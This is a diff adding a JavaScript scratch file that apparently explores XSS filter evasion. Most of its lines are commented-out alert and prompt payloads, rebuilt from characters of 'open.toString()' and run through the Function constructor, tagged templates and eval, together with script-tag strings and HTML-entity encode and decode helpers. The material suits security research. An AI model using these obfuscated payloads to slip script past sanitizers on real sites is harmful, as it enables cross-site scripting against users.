@@ -1,0 +1,136 @@
+var abc = (...input) => {
+	console.log(input);
+	alert(input);
+};
+
+setTimeout(() => {
+	// console.log(document.getElementsByName("name")[0].innerHTML);
+	// var secret = document.getElementsByName("name")[0].innerHTML;
+	// console.log([]);
+	// console.log([][`constructor`]);
+	// console.log([][`constructor`][`constructor`]);
+	// console.log([][`constructor`][`constructor`]('{alert(1);return 1}')());
+	// console.log([][`constructor`][`constructor`](`al` + `e` + `rt('log2')`)());
+	// console.log([{} + {}]);
+	// console.log([open]);
+	// console.log([open + []]);
+	// console.log(open + []);
+	// console.log([open + ["test", {}]]);
+	// console.log([open + ""]);
+	// console.log([open + []][0]);
+	// console.log([open + []][0][14]);
+	// console.log("abc"[1]);
+	// console.log(open.toString());
+	// console.log(open.toString().length);
+	// console.log(
+	// 	`\\${`al` + [open + []][0][11] + `rt` + [open + []][0][13] + [`"`][0] + `Oneconsult` + [`"`][0] + [open + []][0][14]}`,
+	// );
+	// let string1 = "";
+	// let string2 = "";
+	// for (let i = 0; i < open.toString().length; i++) {
+	// 	console.log(open.toString()[i], i);
+	// 	string1 = string1 + open.toString()[i] + (i < 10 ? " " : "  ");
+	// 	string2 = string2 + i + " ";
+	// }
+	// console.log(string1);
+	// console.log(string2);
+	// [][`constructor`][`constructor`]("abc" + [open + []][0][13] + "`XSS`" + [open + []][0][14],)();
+	// console.log(`${`alert(\`T\`)`}`);
+	// eval(`${`abc\`${`someShit`}\``}`)
+	// var f = [][`constructor`][`constructor`]`a${`alert\`${`someShit`}\``}`;
+	// console.log(f)
+	// f``
+	// [][`constructor`][`constructor`]`\`${`abc\`${`someShit2`}\``}\``();
+	// abc`a${`alert\`${`someShit2`}\``}b`;
+
+	// [][`constructor`][`constructor`](`${`al` + [open + []][0][11] + `rt` + [open + []][0][13] + "`Oneconsult`" + [open + []][0][14]}`)()
+
+	// [][`constructor`][`constructor`]`a${`al` + [open + []][0][11] + `rt` + [open + []][0][13] + [`"`][0] + `Oneconsult` + [`"`][0] + [open + []][0][14]}```;
+	// [][`constructor`][`constructor`]`var s = 'alert' + [open + []][0][13] + '2' + [open + []][0][14];[]['constructor']['constructor']('alert' + [open + []][0][13] + '2' + [open + []][0][14])()```;
+	console.log(encodeURIComponent('<script>alert("xss")</script>'))
+	console.log(encodeURIComponent('\nabc'))
+	console.log(encodeHTMLEntities('\nabc'))
+	const a = replaceWithHTMLCharCode('<script>alert(22)</script>')
+	console.log(a)
+	console.log(decodeHTMLEntities(a))
+	// console.log(JSON.parse('{ "body": "alert(1)" }'));
+	// console.log(JSON.stringify(encodeURIComponent('\u0024{`alert`}')))
+	// console.log(encodeURIComponent('alert(`${new Date()}`)'))
+	// console.log(encodeURIComponent(encodeURIComponent('alert(`${new Date()}`)')))
+	// console.log(encodeURIComponent("${`alert`}"))
+	// console.log(decodeURIComponent("%27%7B%60alert%60%7D"))
+	// console.log('prompt')
+	// prompt`now${new Date()}`
+	// confirm('ola')
+	// alert('ola')
+	// console.log(encodeURIComponent('prompt`now${new Date()}`'))
+	// console.log(encodeURIComponent(encodeURIComponent('prompt`now${new Date()}`')))
+	// [][`constructor`][`constructor`]`a${'alert(1)'}```;
+	// [][`constructor`][`constructor`]`a${`al` + [open + []][0][11] + `rt` + [open + []][0][13] + [`"`][0] + `Oneconsult` + [`"`][0] + [open + []][0][14]}```;
+	// console.log(encodeURIComponent('[][`constructor`][`constructor`]`a\u0024{`al`+[open+[]][0][11]+`rt`+[open+[]][0][13]+[`"`][0]+`Oneconsult`+[`"`][0]+[open+[]][0][14]}```'))
+	// console.log(encodeURI('[][`constructor`][`constructor`]`a${`al`+[open+[]][0][11]+`rt`+[open+[]][0][13]+[`"`][0]+`Oneconsult`+[`"`][0]+[open+[]][0][14]}```'))
+	// alert(`${new Date()}`)
+	// const json = JSON.stringify("alert(`${new Date()}`)")
+	// console.log(json)
+	// const s = encodeURIComponent(json);
+	// const s = encodeURIComponent(encodeURIComponent('alert(1)'));
+	// console.log(s);
+	// const ss = decodeURIComponent(s);
+	// console.log(ss);
+	// const getjson = JSON.parse(ss);
+	// console.log(getjson);
+	// [][`constructor`][`constructor`](getjson.body)();
+
+	// [][`constructor`][`constructor`]`alert(1)`();
+	// const html = encodeHTMLEntities('alert`a${1}`')
+	// console.log(html)
+	// const clean = decodeHTMLEntities(html)
+	// console.log(clean)
+	//
+	// const encodedStr = '<script>alert`a\u0024{1}`</script>'.replace(/[\u0000-\u9999<>\&]/g, i => '&#' + i.charCodeAt(0) + ';')
+	// console.log(encodedStr)
+	// const clean2 = decodeHTMLEntities(encodedStr)
+	// console.log(clean2)
+	// prompt`seeValueInInput${1 + 1}`;
+
+	// var tess = 'prompt`a$' + [open + []][0][16] + '1+2' + [open + []][0][36] + '`'
+	// console.log(tess);
+	// eval(tess);
+	// [][`constructor`][`constructor`]('pro' + 'mpt`seeValueInInput$' + [open + []][0][16] + '1+2' + [open + []][0][36] + ':`')();
+	// [][`constructor`][`constructor`]('pro' + 'mpt`seeValueInInput${2+2}:`')();
+	//
+	function replaceWithHTMLCharCode(text)
+	{
+		return text.replace(/[\u0000-\u9999<>\&]/g, i => '&#' + i.charCodeAt(0) + ';')
+	}
+
+	function encodeHTMLEntities(text) {
+		var textArea = document.createElement('textarea');
+		textArea.innerText = text;
+		return textArea.innerHTML;
+	}
+
+	function decodeHTMLEntities(text) {
+		var textArea = document.createElement('textarea');
+		textArea.innerHTML = text;
+		return textArea.value;
+	}
+
+	// console.log(encodeURIComponent('a\uFE69'))
+	// console.log(encodeURIComponent('a{'))
+	// console.log(encodeURIComponent('`${`alert`}'))
+	// console.log('&dollar;&lcub;alert&rcub;')
+	// console.log(decodeURIComponent('a%24%E2%80%A8%7Balert%7D'))
+	// alert('\50abc\51')
+	// alert('\x28abc\x28')
+	// alert('\44def\44')
+	// alert('\x24def\x24')
+	// alert('\x7bghi')
+	// alert('\x24ghi')
+	// [][`constructor`][`constructor`](alert(1))();
+	// [][`constructor`][`constructor`](`al` + `e` + `rt('1')`)();
+	// [].constructor.constructor(`alert('XSS')`)();
+	// eval(`al` + `e` + `rt('2')`);
+	//
+	//
+}, 100); // alert(44)
